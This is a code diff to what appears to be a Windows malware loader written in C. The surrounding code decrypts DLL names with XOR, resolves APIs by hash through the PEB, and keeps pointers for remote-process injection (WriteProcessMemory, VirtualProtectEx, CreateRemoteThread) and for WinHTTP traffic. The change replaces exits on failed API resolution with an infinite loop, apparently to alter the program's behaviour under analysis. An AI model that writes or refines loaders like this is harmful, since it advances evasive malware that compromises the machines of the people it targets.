@@ -1,3 +1,4 @@
+#include <winsock2.h>
 #include <windows.h>
 #include <winhttp.h>
 #include <bcrypt.h>
@@ -184,16 +185,20 @@ PFN_WriteProcessMemory fnWriteProcessMemory = NULL;
 PFN_VirtualProtectEx fnVirtualProtectEx = NULL;
 PFN_CreateRemoteThread fnCreateRemoteThread = NULL;
 
+static void resolve_die(void) {
+    for (;;) { }
+}
+
 void resolve_apis(void) {
     wchar_t _k32w[ENC_DLL_KERNEL32_LEN + 1];
     xor_dec_w(_k32w, ENC_DLL_KERNEL32, ENC_DLL_KERNEL32_LEN);
     HMODULE hK32  = peb_get_module(_k32w);
-    if (!hK32) ExitProcess(0);
+    if (!hK32) resolve_die();
 
     fnLoadLibraryA = (PFN_LoadLibraryA)resolve_hash(hK32, HASH_LoadLibraryA);
-    if (!fnLoadLibraryA) ExitProcess(0);
+    if (!fnLoadLibraryA) resolve_die();
     fnGetModuleHandleA = (PFN_GetModuleHandleA)resolve_hash(hK32, HASH_GetModuleHandleA);
-    if (!fnGetModuleHandleA) ExitProcess(0);
+    if (!fnGetModuleHandleA) resolve_die();
 
     char _wh[ENC_DLL_WINHTTP_LEN+1];  xor_dec(_wh, ENC_DLL_WINHTTP, ENC_DLL_WINHTTP_LEN);
     char _bc[ENC_DLL_BCRYPT_LEN+1];  xor_dec(_bc, ENC_DLL_BCRYPT, ENC_DLL_BCRYPT_LEN);
@@ -217,7 +222,7 @@ void resolve_apis(void) {
 
     #define RESOLVE(ptr, mod, name) \
         ptr = (PFN_##name)resolve_hash(mod, HASH_##name); \
-        if (!ptr) ExitProcess(0)
+        if (!ptr) resolve_die()
 
     RESOLVE(fnWinHttpOpen,                  hWH,  WinHttpOpen);
     RESOLVE(fnWinHttpConnect,               hWH,  WinHttpConnect);
